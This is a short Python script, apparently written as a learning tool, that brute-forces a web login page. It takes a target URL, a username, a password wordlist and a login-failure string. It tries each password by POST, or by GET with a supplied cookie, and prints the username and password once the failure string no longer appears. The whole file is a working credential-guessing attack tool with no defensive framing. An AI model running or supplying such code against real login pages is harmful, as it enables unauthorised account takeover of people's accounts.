import requests
from termcolor import colored

#user inputs
url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For The Account To Bruteforce: ')
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('Enter Cookie Value(Optional): ')


def cracking(username,url):
	"""
	testing all password of this file on gived website 

	Parameters:
	-----------
	username : the username used for this account (str)
	url : link of the website (str)

	Versions:
	---------
	specification : Ahmed Adel BEREKSI REGUIG v1.0 (14/12/2023)
	implementation  : Ahmed Adel BEREKSI REGUIG v1.0 (14/12/2023)
	"""

	#try every password in the file
	for password in passwords:

		#remove white spaces
		password = password.strip()
		#printing message that we are trying to use this password
		print(colored(('Trying: ' + password), 'red'))
		#build data that we will send on our request (contain 
		# html username input name with his value and 
		# html username password with his value and 
		# submit html button name and his type)
		# you can adapt the data to your website here
		data = {'username':username,'password':password,'Login':'submit'}

		#adding cookies value (optional) you can find it on BurpSuite tool
		if cookie_value != '':

			#if we have the cookies value then we are on get method
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:

			#if we haven't the cookies value then we are on post method
			response = requests.post(url, data=data)

		#if the password is wrong 	
		if login_failed_string in response.content.decode():

			#dont do anything
			pass

		#if the password is correct 
		else:

			#printing the username and the password
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			#exit the program
			exit()



#read passwords from file
with open(password_file, 'r') as passwords:

	#perform brute force attack
	cracking(username,url)

#if password not found then print an alert message
print(colored('[!!] Password Not In List', 'yellow'))


